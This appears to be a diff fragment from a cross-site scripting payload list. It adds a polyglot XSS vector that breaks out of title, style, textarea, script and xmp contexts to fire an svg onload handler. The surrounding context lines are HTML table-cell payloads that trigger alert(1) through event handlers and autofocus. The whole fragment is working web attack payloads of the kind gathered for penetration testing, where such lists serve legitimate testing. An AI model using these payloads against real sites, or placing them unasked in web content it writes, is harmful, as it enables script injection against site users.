@@ -176,6 +176,7 @@
   <th oncut=alert(1) value="XSS" autofocus tabindex=1>test
   <th ondblclick="alert(1)" autofocus tabindex=1>test</th>
   <th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>
+  javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
   ```
 </details>
 
